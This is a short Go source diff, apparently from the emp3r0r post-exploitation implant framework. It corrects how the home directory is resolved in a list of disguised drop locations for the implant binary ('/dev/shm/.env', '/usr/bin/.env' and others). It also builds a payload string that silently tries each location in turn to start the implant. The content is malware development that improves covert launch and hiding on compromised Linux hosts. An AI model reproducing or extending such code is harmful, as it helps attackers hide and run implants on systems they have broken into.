@@ -24,7 +24,7 @@ var (
 	}
 
 	// EmpLocations all possible locations
-	EmpLocations = []string{"/tmp/.env", "/dev/shm/.env", "/env", "~/.env", "/usr/bin/.env", "/usr/local/bin/env", "/bin/.env"}
+	EmpLocations = []string{"/tmp/.env", "/dev/shm/.env", "/env", fmt.Sprintf("%s/.env", os.Getenv("HOME")), "/usr/bin/.env", "/usr/local/bin/env", "/bin/.env"}
 
 	// call this to start emp3r0r
 	payload = strings.Join(EmpLocations, ">/dev/null 2>&1 || ") + ">/dev/null 2>&1"
